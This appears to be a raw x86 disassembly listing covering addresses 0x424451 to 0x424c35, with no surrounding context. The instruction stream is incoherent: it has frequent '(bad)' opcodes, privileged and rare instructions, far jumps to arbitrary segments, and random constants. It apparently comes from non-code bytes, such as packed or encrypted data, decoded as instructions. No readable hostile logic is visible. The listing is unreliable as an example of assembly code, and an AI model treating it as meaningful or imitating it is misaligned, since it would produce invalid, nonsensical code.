  424451:	stos   BYTE PTR es:[edi],al
  424452:	in     al,dx
  424453:	push   esp
  424454:	jmp    0x51bd:0xe2d5d47c
  42445b:	xchg   ecx,eax
  42445c:	imul   esi,DWORD PTR ds:0xfb8f2654,0xffffff9c
  424463:	std    
  424464:	cwde   
  424465:	repz sbb DWORD PTR [esi+eax*2+0x53],edx
  42446a:	or     eax,0xb72ce4d4
  42446f:	push   0x8f96e846
  424474:	(bad)  
  424475:	xor    eax,0xe1968bff
  42447a:	jmp    0x989a5174
  42447f:	aad    0x28
  424481:	out    0x3,eax
  424483:	cdq    
  424484:	addr16 push ebp
  424486:	inc    ecx
  424487:	out    dx,al
  424488:	mov    DWORD PTR [edi-0x15],ebx
  42448b:	out    0xdc,eax
  42448d:	test   bh,dl
  42448f:	inc    esi
  424490:	mov    DWORD PTR [edx],eax
  424492:	mov    WORD PTR [ecx+0x7d],ds
  424495:	mov    dh,0x55
  424497:	icebp  
  424498:	xlat   BYTE PTR ds:[ebx]
  424499:	ins    BYTE PTR es:[edi],dx
  42449a:	pop    ds
  42449b:	jns    0x42442d
  42449d:	sbb    dl,ah
  42449f:	xchg   esp,eax
  4244a0:	lods   al,BYTE PTR ds:[esi]
  4244a1:	push   0x7d
  4244a3:	aad    0x2f
  4244a5:	dec    esi
  4244a6:	lahf   
  4244a7:	imul   BYTE PTR [ecx]
  4244a9:	iret   
  4244aa:	jmp    0x8e09:0x2e627973
  4244b1:	and    esp,ebx
  4244b3:	shl    DWORD PTR [eax+0x7424ddf1],0xd6
  4244ba:	rep stos DWORD PTR es:[edi],eax
  4244bc:	into   
  4244bd:	inc    eax
  4244be:	or     BYTE PTR [ecx-0xa],ch
  4244c1:	and    eax,0xad0f455d
  4244c6:	pusha  
  4244c7:	mov    esi,edx
  4244c9:	int3   
  4244ca:	ret    
  4244cb:	xor    ebp,DWORD PTR [esi+edi*8+0x1d18d5ff]
  4244d2:	out    0xc9,eax
  4244d4:	push   ecx
  4244d5:	xchg   BYTE PTR [ebx-0x40],dl
  4244d8:	mov    BYTE PTR [ebx+0x289abc7b],dh
  4244de:	sub    DWORD PTR [ebx-0x6f],esp
  4244e1:	xor    al,0xe
  4244e3:	sub    bh,BYTE PTR [ecx]
  4244e5:	add    bl,BYTE PTR [eax+0x2e]
  4244e8:	mov    ecx,0x88245a77
  4244ed:	mov    bl,0xb5
  4244ef:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4244f1:	mov    ?,ecx
  4244f3:	xchg   edx,eax
  4244f4:	xchg   esi,eax
  4244f5:	int    0xa3
  4244f7:	mov    ds:0xa3696189,al
  4244fc:	jns    0x424559
  4244fe:	call   0x89e1:0x642db6f4
  424505:	lock push ss
  424507:	in     eax,0x8
  424509:	or     al,al
  42450b:	aam    0x95
  42450d:	loopne 0x4244f7
  42450f:	jb     0x4244b3
  424511:	cmp    eax,0x858f70f0
  424516:	pusha  
  424517:	pop    edx
  424518:	xchg   ch,bh
  42451a:	out    dx,al
  42451b:	adc    eax,0x11d7f632
  424520:	ret    0xac72
  424523:	nop
  424524:	mov    BYTE PTR [ecx+0x24],dh
  424527:	mov    ebp,0x79f9572d
  42452c:	mov    DWORD PTR [ebx+0x36],eax
  42452f:	(bad)  
  424530:	lods   al,BYTE PTR ds:[esi]
  424531:	pop    esp
  424532:	(bad)  
  424533:	jge    0x424563
  424535:	add    esp,DWORD PTR [edx]
  424537:	mov    DWORD PTR [eax+eax*8-0x4405640e],ecx
  42453e:	pusha  
  42453f:	ja     0x424520
  424541:	cmp    al,0x29
  424543:	jne    0x42456f
  424545:	fistp  QWORD PTR [edi]
  424547:	xlat   BYTE PTR ds:[ebx]
  424548:	xchg   ebp,eax
  424549:	xchg   edx,eax
  42454a:	(bad)  
  42454b:	in     al,0x1c
  42454d:	dec    esi
  42454e:	imul   esp,DWORD PTR [edi-0x77],0x47
  424552:	icebp  
  424553:	jecxz  0x424576
  424555:	jp     0x424598
  424557:	adc    BYTE PTR [edx+0x2],bh
  42455a:	adc    al,0x82
  42455c:	mov    edx,0xe67ac418
  424561:	pushf  
  424562:	aas    
  424563:	mov    ah,0x88
  424565:	xor    ecx,edx
  424567:	jmp    0x2a3:0x5216306e
  42456e:	push   ds
  42456f:	retf   0xb623
  424572:	sbb    DWORD PTR [edi],esi
  424574:	dec    edi
  424575:	imul   ebx,DWORD PTR [esi],0x5f
  424578:	lods   eax,DWORD PTR ds:[esi]
  424579:	xchg   esi,eax
  42457a:	adc    al,0x28
  42457c:	sbb    bh,BYTE PTR [edi+ecx*4-0x2b]
  424580:	sbb    eax,0xd9bae507
  424585:	(bad)  
  424586:	sub    cx,WORD PTR [eax-0x6ad1bdfd]
  42458d:	and    DWORD PTR [ebx+eax*4+0x514e05a7],0x25bfa4f2
  424598:	pushf  
  424599:	xchg   ecx,eax
  42459a:	pop    ds
  42459b:	add    ecx,DWORD PTR [esi]
  42459d:	dec    edi
  42459e:	mov    WORD PTR [edx],ss
  4245a0:	xor    BYTE PTR [esp+ebx*8+0xbf070d5],al
  4245a7:	jge    0x4245f9
  4245a9:	mov    ebx,DWORD PTR [edx+0x45]
  4245ac:	mov    cl,0xb7
  4245ae:	push   ebp
  4245af:	inc    eax
  4245b0:	mov    DWORD PTR [esi-0x32],esi
  4245b3:	mov    ebp,0xd5dd49f4
  4245b8:	es fwait
  4245ba:	mov    ch,0x16
  4245bc:	adc    BYTE PTR [edx+eiz*8+0x4a],0x8b
  4245c1:	sbb    edi,ebx
  4245c3:	popf   
  4245c4:	sbb    al,0x24
  4245c6:	push   eax
  4245c7:	xchg   ebp,eax
  4245c8:	add    BYTE PTR [ecx],ah
  4245ca:	and    dl,bh
  4245cc:	ins    BYTE PTR es:[edi],dx
  4245cd:	dec    esi
  4245ce:	test   eax,0x66098205
  4245d3:	cmp    DWORD PTR [eax],ecx
  4245d5:	sub    BYTE PTR [bp-0xc],bl
  4245d9:	je     0x4245c0
  4245db:	mov    eax,0x740f17d5
  4245e0:	xchg   esi,eax
  4245e1:	jmp    0x5b1b9406
  4245e6:	mov    edx,DWORD PTR [ecx-0x78]
  4245e9:	push   ecx
  4245ea:	aaa    
  4245eb:	ss nop
  4245ed:	xchg   ebp,eax
  4245ee:	xchg   edi,eax
  4245ef:	int    0xd6
  4245f1:	(bad)  
  4245f3:	aad    0xbb
  4245f5:	jmp    0x95fbb63
  4245fa:	or     al,0xe2
  4245fc:	nop
  4245fd:	daa    
  4245fe:	cmc    
  4245ff:	ret    0xe6a0
  424602:	jo     0x4245ed
  424604:	cli    
  424605:	ror    DWORD PTR [edx-0x2b],1
  424608:	and    ebp,DWORD PTR [edi+0x67]
  42460b:	dec    ecx
  42460c:	sbb    ecx,DWORD PTR [eax-0x55ef6fc5]
  424612:	or     edx,edi
  424614:	or     DWORD PTR [esi+0x55],edx
  424617:	mov    esi,0xd4491f0c
  42461c:	mov    al,0x67
  42461e:	dec    DWORD PTR [eax+0x2288170b]
  424624:	mov    ch,bh
  424626:	xchg   ebx,eax
  424627:	test   ch,cl
  424629:	adc    eax,0x66ee53
  42462e:	(bad)  
  42462f:	pop    edi
  424630:	shl    BYTE PTR [esi-0x651c1cd0],cl
  424636:	bound  edx,QWORD PTR [edx-0x23fd9077]
  42463c:	jb     0x424699
  42463e:	sbb    eax,DWORD PTR ds:0x1f2417e4
  424644:	cs xchg edi,eax
  424646:	in     eax,dx
  424647:	push   esp
  424648:	xor    eax,0x8999d563
  42464d:	pop    ds
  42464e:	jb     0x4246c8
  424650:	arpl   ax,dx
  424652:	adc    ecx,ebx
  424654:	xlat   BYTE PTR ds:[ebx]
  424655:	sbb    al,0x22
  424657:	(bad)  
  424658:	mov    ch,0xbd
  42465a:	fs pop edx
  42465c:	sbb    DWORD PTR [ebx+0x75],ebp
  42465f:	das    
  424660:	mov    DWORD PTR [ebp-0x6c2abbc3],esp
  424666:	int3   
  424667:	ds sub eax,0x169b41f
  42466d:	jge    0x42462c
  42466f:	add    BYTE PTR [eax],cl
  424671:	mov    al,ds:0xe2777027
  424676:	jbe    0x424625
  424678:	mov    dl,0xba
  42467a:	and    bh,dl
  42467c:	mov    ebp,0xd3f7c4a8
  424681:	pop    ss
  424682:	mov    cs,WORD PTR [edi-0x68c705c0]
  424688:	call   0xa8dcf88a
  42468d:	mov    dl,0x66
  42468f:	pop    ds
  424690:	sub    eax,0x704846d7
  424695:	repnz enter 0x147e,0x44
  42469a:	inc    BYTE PTR [esi+0x773e0596]
  4246a0:	fistp  WORD PTR [edx-0xe9e1981]
  4246a6:	pop    ds
  4246a7:	inc    ecx
  4246a8:	clc    
  4246a9:	aam    0xd2
  4246ab:	test   dh,0xf8
  4246ae:	fcmovbe st,st(5)
  4246b0:	xchg   edx,edx
  4246b2:	mov    dl,0x2d
  4246b4:	pop    ss
  4246b5:	ins    DWORD PTR es:[edi],dx
  4246b6:	cmp    BYTE PTR [eax+ecx*4+0xb],al
  4246ba:	mov    esp,0xc930ed1c
  4246bf:	xchg   edi,eax
  4246c0:	lock loopne 0x424730
  4246c3:	aad    0xb0
  4246c5:	iret   
  4246c6:	mov    ebp,0xaf3c7443
  4246cb:	loop   0x4246c1
  4246cd:	jmp    0x4246c9
  4246cf:	aam    0x78
  4246d1:	inc    ebx
  4246d2:	mov    dl,BYTE PTR [eax]
  4246d4:	psubd  mm1,QWORD PTR [edx-0xe]
  4246d8:	(bad)  
  4246da:	push   0xffffff9e
  4246dc:	scas   al,BYTE PTR es:[edi]
  4246dd:	mov    eax,0x35e81d60
  4246e2:	mov    DWORD PTR [edx+ebp*1+0x4c237b6f],eax
  4246e9:	sbb    bl,BYTE PTR [ebx+edx*2-0x5a002f33]
  4246f0:	sub    al,0xe2
  4246f2:	pusha  
  4246f3:	sahf   
  4246f4:	adc    eax,0x8cd4c60f
  4246f9:	cmp    esp,esi
  4246fb:	popa   
  4246fc:	or     ch,ah
  4246fe:	jnp    0x4246e3
  424700:	daa    
  424701:	lgdtd  [edi-0x79]
  424705:	push   0x2a87991
  42470a:	call   0xacc0:0xb104641d
  424711:	mov    ebx,0x4c177960
  424716:	and    al,BYTE PTR [ebx+0x5f3607a9]
  42471c:	xor    dl,cl
  42471e:	push   ds
  42471f:	xlat   BYTE PTR ds:[ebx]
  424720:	mov    ebp,es
  424722:	jmp    0x7cec3933
  424727:	xchg   esp,eax
  424728:	xchg   esi,eax
  424729:	push   ecx
  42472a:	out    dx,al
  42472b:	mov    ds:0x68030364,eax
  424730:	inc    esp
  424731:	or     eax,0xad09d42a
  424736:	jae    0x424765
  424738:	and    BYTE PTR [edx-0x6861fe2d],cl
  42473e:	push   0xffffff86
  424740:	into   
  424741:	sub    esi,esp
  424743:	aam    0xef
  424745:	cwde   
  424746:	dec    ebp
  424747:	cmp    esi,esi
  424749:	add    BYTE PTR [edx+eiz*1+0x76],bl
  42474d:	enter  0x19c8,0xa8
  424751:	pushf  
  424752:	test   eax,0x96430674
  424757:	cmp    BYTE PTR [edi+0x78],0x1f
  42475b:	aas    
  42475c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42475d:	jge    0x424756
  42475f:	jge    0x42477f
  424761:	(bad)  
  424762:	jb     0x424738
  424764:	push   edx
  424765:	es inc edx
  424767:	pop    eax
  424768:	inc    ebp
  424769:	in     al,dx
  42476a:	js     0x424742
  42476c:	mov    BYTE PTR [ebp-0x674805c8],al
  424772:	in     al,0x91
  424774:	fisttp QWORD PTR [ebx-0x416a7ead]
  42477a:	sub    esi,DWORD PTR [ecx]
  42477c:	dec    esp
  42477d:	sbb    eax,0x7a09ca58
  424782:	fnsave [esi-0x77]
  424785:	pop    ss
  424786:	jne    0x424780
  424788:	arpl   WORD PTR [ecx+0x7e],cx
  42478b:	jo     0x424748
  42478d:	int    0xf3
  42478f:	xchg   ebp,eax
  424790:	xchg   DWORD PTR [ebx],edi
  424792:	mov    al,ds:0x6a02433b
  424797:	loope  0x42479a
  424799:	or     bl,BYTE PTR [edi]
  42479b:	mov    bl,0x91
  42479d:	inc    ebx
  42479e:	mov    bh,0x4f
  4247a0:	push   esp
  4247a1:	inc    ebx
  4247a2:	jne    0x424778
  4247a4:	mov    bx,bx
  4247a7:	push   ds
  4247a8:	stos   BYTE PTR es:[edi],al
  4247a9:	aam    0xc9
  4247ab:	push   ss
  4247ac:	mov    BYTE PTR [ebx],ch
  4247ae:	push   edi
  4247af:	pop    ebx
  4247b0:	or     BYTE PTR [esi+0x1d4307e8],cl
  4247b6:	mov    al,ds:0x7a685cc9
  4247bb:	mov    cl,0xc8
  4247bd:	sub    dh,BYTE PTR [esi+0x324dfc43]
  4247c3:	imul   ecx,DWORD PTR [edx-0x28a89dec],0x22
  4247ca:	inc    esi
  4247cb:	push   esp
  4247cc:	dec    ecx
  4247cd:	dec    eax
  4247ce:	mov    ch,0x5a
  4247d0:	ret    
  4247d1:	test   eax,0xbc68121f
  4247d6:	scas   al,BYTE PTR es:[edi]
  4247d7:	jno    0x4247b7
  4247d9:	mov    eax,ds:0x637e2d7d
  4247de:	mov    al,ds:0xa7f6e3d5
  4247e3:	repnz add DWORD PTR [edx],eax
  4247e6:	adc    dh,0x77
  4247e9:	or     BYTE PTR [ecx-0x3e],bh
  4247ec:	pop    edx
  4247ed:	out    dx,al
  4247ee:	pusha  
  4247ef:	sbb    eax,0xb14d2ce8
  4247f4:	sub    al,BYTE PTR [ebp-0x6b]
  4247f7:	shl    edi,cl
  4247f9:	popf   
  4247fa:	fcomp  QWORD PTR [ebp+0x5ecf8a9d]
  424800:	retf   0x1e40
  424803:	push   ebx
  424804:	push   es
  424805:	lods   al,BYTE PTR ds:[esi]
  424806:	rcr    BYTE PTR [ebp-0x6a],1
  424809:	stc    
  42480a:	fst    st(4)
  42480c:	nop
  42480d:	mov    ebx,0xe0a7df55
  424812:	fdivr  QWORD PTR [edi]
  424814:	mov    al,0x2f
  424816:	and    al,0xcc
  424818:	or     bl,dh
  42481a:	stc    
  42481b:	fimul  DWORD PTR [ebp+ebx*2-0x1d]
  42481f:	call   0x309:0x8bf54d79
  424826:	pusha  
  424827:	pop    esp
  424828:	dec    edx
  424829:	xor    eax,0xc581c668
  42482e:	clc    
  42482f:	adc    al,0x8f
  424831:	js     0x4247d1
  424833:	sbb    al,0x26
  424835:	jae    0x42485b
  424837:	sar    ebp,1
  424839:	pop    ss
  42483a:	sbb    al,0x66
  42483c:	cmp    eax,0x68550d4d
  424841:	or     eax,0xc09ad441
  424846:	scas   al,BYTE PTR es:[edi]
  424847:	call   0xc70:0xfdc72602
  42484e:	mov    esi,0x20fa1341
  424853:	inc    edx
  424854:	xchg   ebp,eax
  424855:	call   0x5f91:0x273a7d0
  42485c:	jnp    0x4248b8
  42485e:	fsub   st(0),st
  424860:	imul   ebx,DWORD PTR [eax],0x1bbb951f
  424866:	inc    eax
  424867:	mov    eax,0xab6c8908
  42486c:	cmp    DWORD PTR [ebp-0x18],esi
  42486f:	ins    DWORD PTR es:[edi],dx
  424870:	test   eax,0x48d6fd7b
  424875:	adc    eax,0x2f5b04b6
  42487a:	push   ds
  42487b:	mov    ebx,0x9c8e8154
  424880:	or     dl,al
  424882:	fsub   QWORD PTR cs:[edi+0x3]
  424886:	adc    ah,dl
  424888:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424889:	sub    cl,dl
  42488b:	jle    0x4248a5
  42488d:	cli    
  42488e:	pop    ds
  42488f:	inc    ebx
  424890:	rcr    BYTE PTR [ecx-0x44274f12],1
  424896:	xchg   ebx,eax
  424897:	aad    0xb3
  424899:	aam    0xb9
  42489b:	pop    es
  42489c:	icebp  
  42489d:	add    ch,0x11
  4248a0:	mov    BYTE PTR [ebx-0x62],bh
  4248a3:	dec    eax
  4248a4:	je     0x4248ae
  4248a6:	fwait
  4248a7:	out    dx,al
  4248a8:	test   eax,0x34edee00
  4248ad:	lahf   
  4248ae:	loopne 0x424915
  4248b0:	dec    ebp
  4248b1:	sti    
  4248b2:	and    al,0x68
  4248b4:	xchg   BYTE PTR [ebx-0x31c6c444],dh
  4248ba:	shl    ch,0x80
  4248bd:	xor    BYTE PTR [edi+edx*8],ch
  4248c0:	dec    esi
  4248c1:	bound  eax,QWORD PTR [edi+0x12]
  4248c4:	aas    
  4248c5:	enter  0xa2e,0x89
  4248c9:	add    ecx,DWORD PTR [esi+0x26527bcf]
  4248cf:	mov    cl,0x28
  4248d1:	add    al,dl
  4248d3:	sbb    cl,BYTE PTR ss:[ebx]
  4248d6:	ins    DWORD PTR es:[edi],dx
  4248d7:	cdq    
  4248d8:	lds    edx,FWORD PTR [esi+0x1e]
  4248db:	dec    edi
  4248dc:	cli    
  4248dd:	xchg   esi,eax
  4248de:	pop    ebp
  4248df:	add    ch,BYTE PTR [ebp-0x6c]
  4248e2:	test   edx,0xa02e0235
  4248e8:	jbe    0x424907
  4248ea:	ss push ss
  4248ec:	ret    
  4248ed:	sbb    eax,0x455d51e
  4248f2:	jge    0x4248f5
  4248f4:	(bad)  
  4248f5:	xor    ecx,DWORD PTR [edi]
  4248f7:	shl    BYTE PTR [eax-0x1b],cl
  4248fa:	dec    esp
  4248fb:	(bad)  
  4248fc:	mov    ecx,0x1dd6fe2f
  424901:	test   DWORD PTR [ebp+eiz*4+0x72],eax
  424905:	fldenv [edx-0x39]
  424908:	inc    ecx
  424909:	aad    0x2f
  42490b:	cld    
  42490c:	inc    eax
  42490d:	push   edi
  42490e:	call   0x87df:0x3b2f98ab
  424915:	(bad)  
  424916:	mov    al,ds:0xdc174a3a
  42491b:	loope  0x4248a6
  42491d:	or     ecx,DWORD PTR [ecx]
  42491f:	or     BYTE PTR [edi+0x7b],ah
  424922:	scas   eax,DWORD PTR es:[edi]
  424923:	or     eax,0xc360851a
  424928:	pop    ss
  424929:	xor    ebp,DWORD PTR [ebp+0x191b863f]
  42492f:	or     esp,edx
  424931:	cmp    BYTE PTR [ecx+0xe],ah
  424934:	fbstp  TBYTE PTR [edi+ebp*1-0x27]
  424938:	add    al,BYTE PTR [edx]
  42493a:	inc    eax
  42493b:	or     al,0xa6
  42493d:	push   ss
  42493e:	sysexit 
  424940:	and    esp,ebp
  424942:	add    esp,DWORD PTR [ebx-0x6ae09f93]
  424948:	inc    esi
  424949:	rol    DWORD PTR [ebx],0xe3
  42494c:	stos   BYTE PTR es:[edi],al
  42494d:	in     eax,dx
  42494e:	in     al,0xd7
  424950:	mov    bl,0x4c
  424952:	arpl   bx,ax
  424954:	mov    dl,0x49
  424956:	retf   
  424957:	int3   
  424958:	sub    al,0xdf
  42495a:	fistp  QWORD PTR [ebp+0x57ca5568]
  424960:	fpatan 
  424962:	sub    bh,0xb5
  424965:	add    eax,0xed03f0b4
  42496a:	inc    esp
  42496b:	sub    DWORD PTR [ecx],edx
  42496d:	push   edi
  42496e:	jge    0x4249b7
  424970:	sub    eax,0xefbb1db3
  424975:	add    dl,BYTE PTR [esi]
  424977:	std    
  424978:	lock jns 0x424909
  42497b:	aam    0xe5
  42497d:	pop    eax
  42497e:	or     bh,al
  424980:	adc    eax,0x89b7fa01
  424985:	jmp    0x424973
  424987:	mov    ecx,0xa4003b9e
  42498c:	mov    al,0x1c
  42498e:	and    al,0xf5
  424990:	nop    edi
  424993:	push   es
  424994:	mov    DWORD PTR [edx-0x22],ebx
  424997:	out    0xa4,al
  424999:	mov    ch,0x78
  42499b:	pop    ds
  42499c:	fwait
  42499d:	lahf   
  42499e:	jle    0x424975
  4249a0:	out    dx,al
  4249a1:	inc    ebx
  4249a2:	js     0x4249ee
  4249a4:	sub    al,0x46
  4249a6:	push   ss
  4249a7:	inc    eax
  4249a8:	mov    ebx,0x43a4b085
  4249ad:	xchg   ebx,eax
  4249ae:	push   cs
  4249af:	dec    edx
  4249b0:	(bad)  
  4249b1:	fbld   TBYTE PTR [esi+0x23]
  4249b4:	cs test eax,0x1686c43c
  4249ba:	retf   
  4249bb:	aam    0xce
  4249bd:	sbb    ebx,DWORD PTR [esi]
  4249bf:	pop    edx
  4249c0:	dec    ebp
  4249c1:	push   esi
  4249c2:	cmp    eax,0x1235f473
  4249c7:	aam    0xea
  4249c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4249ca:	xor    ebx,edi
  4249cc:	stos   BYTE PTR es:[edi],al
  4249cd:	mov    ebx,0x1cb4d57d
  4249d2:	stos   DWORD PTR es:[edi],eax
  4249d3:	push   ebp
  4249d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4249d5:	inc    edx
  4249d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4249d7:	mov    DWORD PTR [ebx-0x79855dad],ecx
  4249dd:	mov    ah,0x9
  4249df:	mov    ebx,0xd4440d68
  4249e4:	push   ds
  4249e5:	test   eax,0x3c0725a2
  4249ea:	mov    ds:0xbfdd95d5,eax
  4249ef:	dec    edi
  4249f0:	cmp    DWORD PTR [ecx],0x1e
  4249f3:	(bad)  
  4249f4:	cmc    
  4249f5:	push   ds
  4249f6:	cdq    
  4249f7:	adc    edx,0x35
  4249fa:	and    edx,esp
  4249fc:	push   bp
  4249fe:	aam    0xe3
  424a00:	nop
  424a01:	or     DWORD PTR [ebx+0x15b2f274],esi
  424a07:	shr    BYTE PTR [ebp+0x19],cl
  424a0a:	cdq    
  424a0b:	mov    dh,0xa2
  424a0d:	hlt    
  424a0e:	lock out dx,al
  424a10:	or     eax,0x68fb6015
  424a15:	xchg   ebx,eax
  424a16:	mov    edi,0x27615c63
  424a1b:	ret    
  424a1c:	pop    ds
  424a1d:	add    edx,DWORD PTR [eax+0x17]
  424a20:	adc    eax,0xc57136d0
  424a25:	int    0x59
  424a27:	icebp  
  424a28:	in     eax,dx
  424a29:	xlat   BYTE PTR ds:[ebx]
  424a2a:	pusha  
  424a2b:	fdivr  QWORD PTR [edi]
  424a2d:	sub    ebx,edi
  424a2f:	pop    esi
  424a30:	cli    
  424a31:	sbb    dh,cl
  424a33:	dec    edi
  424a34:	mov    bl,0x3b
  424a36:	xlat   BYTE PTR ss:[ebx]
  424a38:	hlt    
  424a39:	loopne 0x424a70
  424a3b:	push   cs
  424a3c:	mov    ebp,edi
  424a3e:	mov    ds:0x1c71025b,al
  424a43:	jno    0x4249d3
  424a45:	add    al,BYTE PTR [ebx+eiz*8+0x1c]
  424a49:	pop    es
  424a4a:	jmp    0x8982:0x3e291215
  424a51:	xor    DWORD PTR [esi],edx
  424a53:	enter  0xad91,0xec
  424a57:	add    BYTE PTR [eax+0x1d],dl
  424a5a:	adc    dl,BYTE PTR [ebp-0x7]
  424a5d:	ins    DWORD PTR es:[edi],dx
  424a5e:	and    al,0x92
  424a60:	xchg   edi,eax
  424a61:	cmp    ebp,esi
  424a63:	test   al,0x60
  424a65:	or     BYTE PTR [ebp-0x13c0b7d],0xd5
  424a6c:	xchg   edi,eax
  424a6d:	mov    ds:0xcc9c4117,eax
  424a72:	adc    ah,BYTE PTR [edi]
  424a74:	scas   al,BYTE PTR es:[edi]
  424a75:	(bad)  
  424a76:	dec    esi
  424a77:	out    dx,eax
  424a78:	mov    DWORD PTR [ebp+0x5657032f],ecx
  424a7e:	push   cs
  424a7f:	aad    0x1f
  424a81:	add    bh,BYTE PTR [esi+0x3a5f6e25]
  424a87:	hlt    
  424a88:	ss jmp 0x424aec
  424a8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a8c:	and    BYTE PTR [eax],cl
  424a8e:	(bad)  
  424a8f:	mov    edx,DWORD PTR [edi+0x68841e70]
  424a95:	cli    
  424a96:	sbb    BYTE PTR cs:[ecx+0x7e],ah
  424a9a:	pop    ds
  424a9b:	inc    ebp
  424a9c:	or     DWORD PTR [edx],esi
  424a9e:	hlt    
  424a9f:	mov    ds:0xd5dfa580,eax
  424aa4:	cmp    al,BYTE PTR [bx+di-0x47]
  424aa8:	jae    0x424b1b
  424aaa:	jg     0x424b14
  424aac:	or     bl,0x7e
  424aaf:	cdq    
  424ab0:	icebp  
  424ab1:	mov    dl,0x1f
  424ab3:	inc    esi
  424ab4:	aam    0x8
  424ab6:	add    eax,0x4927eed4
  424abb:	mov    fs,WORD PTR [eax-0x77229cf1]
  424ac1:	mul    DWORD PTR [edi]
  424ac3:	push   ebx
  424ac4:	dec    ecx
  424ac5:	mov    ds:0x2582e1db,eax
  424aca:	and    DWORD PTR [esi+0x56057107],ebx
  424ad0:	stos   DWORD PTR es:[edi],eax
  424ad1:	jns    0x424b1f
  424ad3:	fnstsw WORD PTR [edx-0x6d]
  424ad6:	es out 0x88,eax
  424ad9:	aaa    
  424ada:	repz mov dl,0x84
  424add:	lods   eax,DWORD PTR ds:[esi]
  424ade:	or     al,0x13
  424ae0:	cdq    
  424ae1:	add    eax,0xdee07806
  424ae6:	popa   
  424ae7:	mov    eax,ds:0x497c214e
  424aec:	mov    al,ds:0x1994fa4b
  424af1:	popf   
  424af2:	imul   edi,DWORD PTR [esi+0x66],0x1ad543e1
  424af9:	xchg   DWORD PTR [edx-0x623fc8d8],ebx
  424aff:	lods   al,BYTE PTR ds:[esi]
  424b00:	mov    WORD PTR [ecx+0x18],fs
  424b03:	imul   ebx,DWORD PTR [ebx+0x28],0xe288de69
  424b0a:	push   ss
  424b0b:	(bad)  
  424b0c:	(bad)  
  424b0d:	push   esp
  424b0e:	dec    esi
  424b0f:	pop    es
  424b10:	sub    esi,DWORD PTR [esi+0x631c3a5b]
  424b16:	sahf   
  424b17:	mov    ebx,DWORD PTR [eax-0x1b]
  424b1a:	fs out 0x8c,al
  424b1d:	xchg   ebx,eax
  424b1e:	sub    eax,0x35353e8
  424b23:	stos   BYTE PTR es:[edi],al
  424b24:	mov    ch,BYTE PTR [esi+edi*8+0x3c]
  424b28:	ret    
  424b29:	lods   al,BYTE PTR ds:[esi]
  424b2a:	jo     0x424af0
  424b2c:	mov    ebx,0x8a0fd817
  424b31:	mov    dl,0xdf
  424b33:	aam    0x81
  424b35:	push   ds
  424b36:	aad    0xa3
  424b38:	mov    BYTE PTR [ebp+0x8250b23],al
  424b3e:	sbb    eax,0xd04a22b2
  424b43:	imul   ecx,ebx,0xffffff85
  424b46:	data16 mov BYTE PTR [ebx-0x56ea1173],0x22
  424b4e:	push   ds
  424b4f:	lods   eax,DWORD PTR ds:[esi]
  424b50:	xor    ebp,ecx
  424b52:	sbb    DWORD PTR [edx-0x2bf268ee],eax
  424b58:	call   0x26cde8ba
  424b5d:	imul   ecx,DWORD PTR ds:0x208b89bb,0xffffff8e
  424b64:	lock loop 0x424b2e
  424b67:	(bad)  
  424b68:	jno    0x424b6d
  424b6a:	(bad)  
  424b6b:	(bad)  
  424b6c:	sub    BYTE PTR [edi+0x63b5fbd6],cl
  424b72:	push   ds
  424b73:	dec    ecx
  424b74:	int    0xbf
  424b76:	jle    0x424b1b
  424b78:	jb     0x424b1e
  424b7a:	lods   al,BYTE PTR ds:[esi]
  424b7b:	aam    0xb1
  424b7d:	fs jbe 0x424b6f
  424b80:	lods   eax,DWORD PTR ds:[esi]
  424b81:	idiv   DWORD PTR [edi+edi*8]
  424b84:	fwait
  424b85:	jae    0x424b78
  424b87:	xor    al,0x99
  424b89:	add    eax,0x26de87f7
  424b8e:	cmp    al,0xd7
  424b90:	retf   
  424b91:	mov    bh,0x97
  424b93:	jno    0x424bea
  424b95:	sub    DWORD PTR [esi-0x6ec7626],edx
  424b9b:	mov    esp,0xa522d05f
  424ba0:	jo     0x424ba5
  424ba2:	loopne 0x424bec
  424ba4:	push   ds
  424ba5:	call   0xf90c:0xfbac5eb4
  424bac:	mov    cl,dh
  424bae:	call   DWORD PTR [ebx-0x2]
  424bb1:	stos   DWORD PTR es:[edi],eax
  424bb2:	ret    0xc9f8
  424bb5:	add    eax,0xc89792d0
  424bba:	jmp    0x89f9:0x3389d4c
  424bc1:	xor    eax,0xe245a6e
  424bc6:	rcr    DWORD PTR [ecx-0x2ec7e1c2],1
  424bcc:	in     al,0xd4
  424bce:	mov    bl,0x21
  424bd0:	dec    ecx
  424bd1:	add    DWORD PTR [ecx],eax
  424bd3:	int3   
  424bd4:	bound  edi,QWORD PTR [edx+0x68]
  424bd7:	pop    ebp
  424bd8:	scas   eax,DWORD PTR es:[edi]
  424bd9:	jnp    0x424bd3
  424bdb:	cs push es
  424bdd:	lea    eax,[eax+0x6c]
  424be0:	inc    eax
  424be1:	pop    ecx
  424be2:	(bad)  
  424be3:	xlat   BYTE PTR ds:[ebx]
  424be4:	pop    ebp
  424be5:	or     edi,0xffffffdd
  424be8:	out    dx,al
  424be9:	fs inc esp
  424beb:	fstp   st(5)
  424bed:	jnp    0x424b88
  424bef:	jno    0x424c1a
  424bf1:	add    ecx,DWORD PTR [ecx]
  424bf3:	repnz imul ecx,DWORD PTR [esi+0x5a0f8ed3],0x2e0969f8
  424bfe:	bound  ebx,QWORD PTR [edx+0x39]
  424c01:	add    edx,DWORD PTR [edx]
  424c03:	scas   eax,DWORD PTR es:[edi]
  424c04:	daa    
  424c05:	jl     0x424c45
  424c07:	mov    edi,0x14f3d194
  424c0c:	push   esp
  424c0d:	inc    ebx
  424c0e:	out    dx,eax
  424c0f:	pop    ecx
  424c10:	push   eax
  424c11:	mov    eax,0x8774d554
  424c16:	dec    edi
  424c17:	xor    al,0xbc
  424c19:	mov    dh,0x4b
  424c1b:	jns    0x424ba5
  424c1d:	sbb    edi,DWORD PTR [esi-0x5a2a47f3]
  424c23:	push   edi
  424c24:	xchg   ebx,eax
  424c25:	and    al,0x74
  424c27:	lock rcl BYTE PTR [edi],1
  424c2a:	fbstp  TBYTE PTR [edx]
  424c2c:	adc    ah,dh
  424c2e:	pushf  
  424c2f:	cmp    cl,BYTE PTR [ecx+0x1c3d38ad]
  424c35:	push   ds
